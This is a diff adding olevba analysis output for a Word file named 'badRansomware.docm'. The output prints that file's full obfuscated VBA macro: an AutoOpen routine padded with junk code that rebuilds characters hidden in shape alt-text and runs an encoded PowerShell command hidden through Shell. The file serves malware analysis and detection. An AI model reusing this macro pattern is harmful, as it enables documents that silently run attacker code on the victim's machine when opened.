@@ -1,0 +1,291 @@
+olevba 0.60 on Python 2.7.16 - http://decalage.info/python/oletools
+===============================================================================
+FILE: badRansomware.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
+
+Sub AutoOpen()
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim lqijdaihdm, ozmuxxvcfj
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+lqijdaihdm = 219
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+ozmuxxvcfj = 11 / Tan(lqijdaihdm)
+Dim nxvrbjohlp
+Sleep 0
+Sleep 0
+Sleep 0
+Dim bhofyfqsep, qfqgcgzjyw
+Sleep 0
+bhofyfqsep = 213
+Sleep 0
+Sleep 0
+Sleep 0
+qfqgcgzjyw = 2 / Tan(bhofyfqsep)
+nxvrbjohlp = ActiveDocument.Shapes("pelxcitrdd").AlternativeText
+Dim flodmtaypj, jvlnaehckw
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+flodmtaypj = 216
+Sleep 0
+Sleep 0
+Sleep 0
+jvlnaehckw = 16 / Tan(flodmtaypj)
+nxvrbjohlp = ActiveDocument.Shapes("adaopiwer").AlternativeText & nxvrbjohlp
+Dim cfojvvygsc, kusmewpqle
+Sleep 0
+Sleep 0
+Sleep 0
+cfojvvygsc = 142
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+kusmewpqle = 7 / Tan(cfojvvygsc)
+Dim hxeayqcjkw
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim mpjdkfcpwy, pwskaanarc
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+mpjdkfcpwy = 176
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+pwskaanarc = 3 / Tan(mpjdkfcpwy)
+hxeayqcjkw = "@@@"
+Dim sakzfltqsd, tmjquuqxcn
+Sleep 0
+Sleep 0
+sakzfltqsd = 114
+Sleep 0
+Sleep 0
+Sleep 0
+tmjquuqxcn = 13 / Tan(sakzfltqsd)
+nxvrbjohlp = Split(nxvrbjohlp, hxeayqcjkw)
+Dim xdbhkftuxy, xfmydgoyhg
+Sleep 0
+Sleep 0
+xdbhkftuxy = 244
+Sleep 0
+xfmydgoyhg = 7 / Tan(xdbhkftuxy)
+Dim gvkbqsplby
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim fvhgsaanbr, mlxrgwziup
+Sleep 0
+fvhgsaanbr = 164
+Sleep 0
+mlxrgwziup = 20 / Tan(fvhgsaanbr)
+gvkbqsplby = 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim rwruwadwii, zlhnhmondv
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+rwruwadwii = 261
+Sleep 0
+zlhnhmondv = 9 / Tan(rwruwadwii)
+Dim qtlapbphgi
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim yjxjcijsmy, cnvhrfgahf
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+yjxjcijsmy = 142
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+cnvhrfgahf = 6 / Tan(yjxjcijsmy)
+qtlapbphgi = UBound(nxvrbjohlp) - 1
+Dim vcagzoujxg, tmxbnkwhov
+Sleep 0
+vcagzoujxg = 299
+Sleep 0
+tmxbnkwhov = 20 / Tan(vcagzoujxg)
+Dim zxzflmeecx
+For E = gvkbqsplby To qtlapbphgi
+Dim qyexnwafyb, hhxzrzkunq
+Sleep 0
+Sleep 0
+Sleep 0
+qyexnwafyb = 209
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+hhxzrzkunq = 12 / Tan(qyexnwafyb)
+Dim otfyqjyayp
+Sleep 0
+Sleep 0
+Dim uagvycagqv, sqqsddtdeo
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+uagvycagqv = 193
+Sleep 0
+Sleep 0
+Sleep 0
+sqqsddtdeo = 6 / Tan(uagvycagqv)
+Dim jqdtyohplz
+Sleep 0
+Sleep 0
+Sleep 0
+Dim kfjpmnjmnk, trgorcjrzg
+Sleep 0
+kfjpmnjmnk = 121
+Sleep 0
+trgorcjrzg = 8 / Tan(kfjpmnjmnk)
+otfyqjyayp = nxvrbjohlp(E)
+Dim izzwsqycpd, sgptfleqdc
+Sleep 0
+Sleep 0
+izzwsqycpd = 144
+Sleep 0
+Sleep 0
+Sleep 0
+sgptfleqdc = 14 / Tan(izzwsqycpd)
+jqdtyohplz = ChrW(otfyqjyayp)
+Dim iehqtgzbix, dimapxqodt
+Sleep 0
+iehqtgzbix = 281
+Sleep 0
+dimapxqodt = 11 / Tan(iehqtgzbix)
+zxzflmeecx = zxzflmeecx & jqdtyohplz
+Dim zgtmroijyp, qgohafconv
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+zgtmroijyp = 127
+Sleep 0
+Sleep 0
+qgohafconv = 19 / Tan(zgtmroijyp)
+Next
+Dim uhykmvhjep, sbplkxtzdh
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+uhykmvhjep = 164
+Sleep 0
+Sleep 0
+sbplkxtzdh = 20 / Tan(uhykmvhjep)
+zxzflmeecx = "ell -e IAB" & zxzflmeecx
+Dim nmcjkawjha, ssykbvliaz
+Sleep 0
+Sleep 0
+Sleep 0
+nmcjkawjha = 124
+Sleep 0
+Sleep 0
+Sleep 0
+ssykbvliaz = 16 / Tan(nmcjkawjha)
+zxzflmeecx = "wersh" & zxzflmeecx
+Dim bxjbolkxwx, zkvbaocdar
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+bxjbolkxwx = 140
+Sleep 0
+Sleep 0
+zkvbaocdar = 7 / Tan(bxjbolkxwx)
+zxzflmeecx = "po" & zxzflmeecx
+Dim hywymasgnh, axfgmhjfgt
+Sleep 0
+hywymasgnh = 168
+Sleep 0
+Sleep 0
+Sleep 0
+axfgmhjfgt = 13 / Tan(hywymasgnh)
+Call Shell(zxzflmeecx, 0)
+Sleep 0
+Dim zrekfillik, gxwbfbnogb
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+zrekfillik = 181
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+gxwbfbnogb = 14 / Tan(zrekfillik)
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+Dim rflodrfqdx, rtkvsswpoh
+Sleep 0
+Sleep 0
+Sleep 0
+Sleep 0
+rflodrfqdx = 123
+Sleep 0
+Sleep 0
+rtkvsswpoh = 15 / Tan(rflodrfqdx)
+End Sub
+
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Lib                 |May run code from a DLL                      |
+|Suspicious|ChrW                |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
++----------+--------------------+---------------------------------------------+
+
